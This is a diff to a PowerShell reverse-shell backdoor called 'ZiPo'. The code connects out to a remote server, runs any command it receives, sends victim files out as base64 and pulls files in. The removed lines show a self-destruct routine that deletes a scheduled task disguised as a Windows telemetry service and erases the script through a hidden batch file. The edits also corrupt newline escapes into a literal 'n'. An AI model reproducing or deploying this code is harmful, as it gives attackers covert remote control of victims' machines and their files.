@@ -5,7 +5,7 @@ function Connect-ZiPo {
     function Upload-File($path) {
         if (Test-Path $path) {
             $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
-            return "[UPLOAD]::$(Split-Path $path -Leaf)::`n$b64"
+            return "[UPLOAD]::$(Split-Path $path -Leaf)::n$b64"
         } else {
             return "[ERROR]::FILE NOT FOUND: $path"
         }
@@ -17,33 +17,13 @@ function Connect-ZiPo {
         return "[DOWNLOADED] $out"
     }
 
-    function Self-Destruct {
-        try {
-            $taskName = "\Microsoft\Windows\Shell\SystemTelemetryService"
-            schtasks /delete /tn $taskName /f | Out-Null
-        } catch {}
-
-        $selfPath = $MyInvocation.MyCommand.Definition
-        $batPath = "$env:TEMP\cleanup.bat"
-
-        $batContent = @"
-@echo off
-timeout /t 2 >nul
-del "$selfPath" /f /q
-del "%~f0" /f /q
-"@
-        Set-Content -Path $batPath -Value $batContent -Encoding ASCII
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batPath" -WindowStyle Hidden
-        exit
-    }
-
     while ($true) {
         try {
             $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
             $stream = $tcp.GetStream()
             [byte[]]$buffer = 0..65535 | % { 0 }
 
-            # ANSI баннер
+            # ANSI-цвета и баннер
             $esc = [char]27
             $clear = "$esc[2J$esc[H"
             $banner = @"
@@ -57,46 +37,45 @@ ${esc}[31m
         _\/\\\_______________\/\\\______________/\\\______\//\\\_     
          _\/\\\_______________\/\\\\\\\\\\\\\\\_\///\\\\\\\\\\\/__    
           _\///________________\///////////////____\///////////____${esc}[0m
-[+] ZiPo Connected: $env:USERNAME@$env:COMPUTERNAME
+
+${esc}[32m[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
-Architecture: $env:PROCESSOR_ARCHITECTURE
---------------------------------------------------------${esc}[0m
+Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
+------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + "`nPS " + (Get-Location) + "> "
+            $intro = $clear + $banner + "nPS " + (Get-Location) + "> "
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
 
             while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                 $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()
+
                 try {
-                    if ($cmd -eq "!die") {
-                        $response = "[+] SELF-DESTRUCT INITIATED"
-                        $stream.Write([Text.Encoding]::UTF8.GetBytes($response), 0, $response.Length)
-                        $stream.Flush()
-                        Self-Destruct
-                        return
-                    } elseif ($cmd.StartsWith("!get")) {
+                    if ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(4).Trim()
                         $response = Upload-File $path
-                    } elseif ($cmd.StartsWith("!post")) {
+                    }
+                    elseif ($cmd.StartsWith("!post")) {
                         $parts = $cmd.Split("::")
                         if ($parts.Length -eq 3) {
                             $response = Download-File $parts[1].Trim() $parts[2].Trim()
                         } else {
                             $response = "[ERROR] INVALID POST FORMAT"
                         }
-                    } else {
+                    }
+                    else {
                         $sb = [ScriptBlock]::Create($cmd)
                         $output = & $sb 2>&1 | Out-String
                         $response = $output.TrimEnd()
                     }
-                } catch {
+                }
+                catch {
                     $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
-                $response += "`nPS " + (Get-Location) + "> "
+                $response += "nPS " + (Get-Location) + "> "
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                 $stream.Write($outBytes, 0, $outBytes.Length)
                 $stream.Flush()
@@ -104,7 +83,8 @@ Architecture: $env:PROCESSOR_ARCHITECTURE
 
             $stream.Close()
             $tcp.Close()
-        } catch {
+        }
+        catch {
             Start-Sleep -Seconds 5
         }
     }
